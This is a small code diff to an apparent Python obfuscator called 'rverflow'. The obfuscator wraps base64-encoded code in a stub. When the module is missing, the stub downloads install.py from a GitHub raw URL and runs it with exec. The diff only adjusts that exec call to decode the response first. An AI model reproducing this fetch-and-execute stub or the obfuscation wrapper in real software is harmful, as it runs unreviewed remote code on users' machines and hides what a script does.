@@ -1,7 +1,7 @@
 import base64, os, random, string
 balls = str(string.digits) + string.ascii_letters
 def ecr(f, j=False):
-     ass = ["""'obfuscated with rverflow';import requests, os\ntry:\n      import rverflow\nexcept ImportError:\n     r=requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/install.py");exec(r.content)\nexec(rverflow.dcr('"""]
+     ass = ["""'obfuscated with rverflow';import requests, os\ntry:\n      import rverflow\nexcept ImportError:\n     r=requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/install.py");exec(r.content.decode())\nexec(rverflow.dcr('"""]
      ass2 = []
      for i in f:
           ass2.append(base64.b64encode(i.encode()))
